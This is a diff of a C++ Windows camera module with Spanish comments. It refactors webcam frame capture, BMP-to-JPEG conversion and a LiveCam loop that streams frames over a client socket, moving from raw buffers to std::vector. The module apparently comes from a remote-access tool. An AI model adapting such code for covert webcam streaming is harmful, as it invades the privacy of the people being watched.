@@ -36,7 +36,7 @@ int mod_Camera::GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
     return -1;  // Failure
 }
 
-BYTE* mod_Camera::bmpHeader(LONG lWidth, LONG lHeight, WORD wBitsPerPixel, const unsigned long& padding_size, DWORD iBuffersize, unsigned int& iBuffsizeOut) {
+std::vector<BYTE> mod_Camera::bmpHeader(LONG lWidth, LONG lHeight, WORD wBitsPerPixel, const unsigned long& padding_size, DWORD iBuffersize) {
     //Liberar buffer retornado
     unsigned long headers_size = sizeof(BITMAPFILEHEADER) +
         sizeof(BITMAPINFOHEADER);
@@ -64,15 +64,15 @@ BYTE* mod_Camera::bmpHeader(LONG lWidth, LONG lHeight, WORD wBitsPerPixel, const
     bfh.bfSize = headers_size + pixel_data_size;
 
     unsigned int uiHeadsize = sizeof(bfh) + sizeof(bmpInfoHeader);
-    iBuffsizeOut = uiHeadsize;
-    BYTE* nBuffer = new BYTE[uiHeadsize];
-    memcpy(nBuffer, &bfh, sizeof(bfh));
-    memcpy(nBuffer + sizeof(bfh), &bmpInfoHeader, sizeof(bmpInfoHeader));
+    
+    std::vector<BYTE> nBuffer(uiHeadsize);
+    memcpy(nBuffer.data(), &bfh, sizeof(bfh));
+    memcpy(nBuffer.data() + sizeof(bfh), &bmpInfoHeader, sizeof(bmpInfoHeader));
 
     return nBuffer;
 }
 
-BYTE* mod_Camera::toJPEG(BYTE*& bmpBuffer, u_int uiBuffersize, u_int& uiOutBufferSize) {
+std::vector<BYTE> mod_Camera::toJPEG(BYTE* bmpBuffer, u_int uiBuffersize) {
     //Liberar buffer despues de haberse usado
     HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);
 
@@ -80,16 +80,17 @@ BYTE* mod_Camera::toJPEG(BYTE*& bmpBuffer, u_int uiBuffersize, u_int& uiOutBuffe
     ULONG_PTR gdiplusToken;
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
-    Gdiplus::Image* nImage;
+    Gdiplus::Image* nImage = nullptr;
     Gdiplus::Status  stat;
     STATSTG statstg;
     IStream* oStream;
     IStream* nStream;
     CLSID   encoderClsid;
-    BYTE* bJPEGbuffer = nullptr;
     ULONG bytesRead;
     u_int uiBuffS = 0;
     int iRet = 0;
+
+    std::vector<BYTE> bJPEGbuffer;
 
     HRESULT hr;
 
@@ -137,15 +138,14 @@ BYTE* mod_Camera::toJPEG(BYTE*& bmpBuffer, u_int uiBuffersize, u_int& uiOutBuffe
     }
 
     uiBuffS = statstg.cbSize.LowPart; //Asuming is lower than 4G duuuh
-    bJPEGbuffer = new BYTE[uiBuffS];
+    bJPEGbuffer.resize(uiBuffS, 0);
+
 
     oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
 
-    hr = oStream->Read(bJPEGbuffer, uiBuffS, &bytesRead);
+    hr = oStream->Read(bJPEGbuffer.data(), uiBuffS, &bytesRead);
     if (hr != S_OK) {
         DebugPrint("[X] oStream->Read");
-    }else {
-        uiOutBufferSize = bytesRead;
     }
 
 
@@ -397,10 +397,10 @@ HRESULT mod_Camera::Init(IMFActivate*& pDevice, int pIndexDev) {
     return hr;
 }
 
-BYTE* mod_Camera::GetFrame(int& iBytesOut, int pIndexDev) {
+std::vector<BYTE> mod_Camera::GetFrame(int pIndexDev) {
     //Liberar buffer retornado despues de haberse usado
     
-    BYTE* cBufferOut = NULL;
+    std::vector<BYTE> cBufferOut;
     DWORD streamIndex, flags;
     LONGLONG llTimeStamp;
     IMFSample* pSample = NULL;
@@ -537,22 +537,15 @@ BYTE* mod_Camera::GetFrame(int& iBytesOut, int pIndexDev) {
             {
                 // Unlock the buffer when done.
 
-                unsigned int iOutSize = 0;
-                BYTE* bmpHeadBuff = this->bmpHeader(this->vcCamObjs[pIndexDev].width, this->vcCamObjs[pIndexDev].height, 24, 0, currentLength, iOutSize);
-
-                cBufferOut = new BYTE[currentLength + iOutSize];
-                if (bmpHeadBuff) {
-                    memcpy(cBufferOut, bmpHeadBuff, iOutSize);
-                    memcpy(cBufferOut + iOutSize, pData, currentLength);
-                    delete[] bmpHeadBuff;
-                    bmpHeadBuff = nullptr;
+                std::vector<BYTE> bmpHeadBuff = this->bmpHeader(this->vcCamObjs[pIndexDev].width, this->vcCamObjs[pIndexDev].height, 24, 0, currentLength);
+                int iOutSize = bmpHeadBuff.size();
+                if (iOutSize > 0) {
+                    cBufferOut.resize(currentLength + iOutSize, 0);
+                    memcpy(cBufferOut.data(), bmpHeadBuff.data(), iOutSize);
+                    memcpy(cBufferOut.data() + iOutSize, pData, currentLength);
                 } else {
                     DebugPrint("[X] No se pudo crear la cabecera bmp");
-                    delete[] cBufferOut;
-                    cBufferOut = nullptr;
                 }
-                            
-                iBytesOut = currentLength + iOutSize;
 
                 pBuffer->Unlock();
             }
@@ -605,36 +598,32 @@ void mod_Camera::LiveCam(int pIndexDev) {
         int iHeaderSize = strHeader.size();
 
         while (this->vcCamObjs[pIndexDev].isLive) {
-            int iBufferSize = 0;
-            u_int iJPGBufferSize = 0;
             u_int uiPacketSize = 0;
-            BYTE* cBuffer = this->GetFrame(iBufferSize, pIndexDev);
-            BYTE* cJPGBuffer = nullptr;
-            BYTE* cPacket = nullptr;
-
-            if (cBuffer) {
-                cJPGBuffer = this->toJPEG(cBuffer, iBufferSize, iJPGBufferSize);
-                if (cJPGBuffer) {
-                    uiPacketSize = iHeaderSize + iJPGBufferSize;
-                    cPacket = new BYTE[uiPacketSize];
+            DebugPrint("[LIVECAM] Leyendo frame...");
+            std::vector<BYTE> cBuffer = this->GetFrame(pIndexDev);
+            
+            if (cBuffer.size() > 0) {
+                DebugPrint("[LIVECAM] Convirtiendo a jpg...");
+                std::vector<BYTE> cJPGBuffer = this->toJPEG(cBuffer.data(), cBuffer.size());
+                if (cJPGBuffer.size() > 0) {
+                    uiPacketSize = iHeaderSize + cJPGBuffer.size();
+                    std::unique_ptr<BYTE[]> cPacket = std::make_unique<BYTE[]>(uiPacketSize);
                     if (cPacket) {
-                        memcpy(cPacket, strHeader.c_str(), iHeaderSize);
-                        memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);
+                        memcpy(cPacket.get(), strHeader.c_str(), iHeaderSize);
+                        memcpy(cPacket.get() + iHeaderSize, cJPGBuffer.data(), cJPGBuffer.size());
                         
-                        cCliente->cSend(cCliente->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
-                        
-                        delete[] cPacket;
-                        cPacket = nullptr;
+                        int iSent = cCliente->cSend(cCliente->sckSocket, reinterpret_cast<const char*>(cPacket.get()), uiPacketSize, 0, true, nullptr);
+                        DebugPrint("[!] " + std::to_string(iSent) + " bytes sent");
+                        if (iSent == -1) {
+                            this->vcCamObjs[pIndexDev].isLive = false;
+                            break;
+                        }
                     }
-                    delete[] cJPGBuffer;
-                    cJPGBuffer = nullptr;
+
                 }
             }
-
-            if (cBuffer) {
-                delete[] cBuffer;
-                cBuffer = nullptr;
-            }
         }
+
+        DebugPrint("[!]Live terminado");
     }
 }
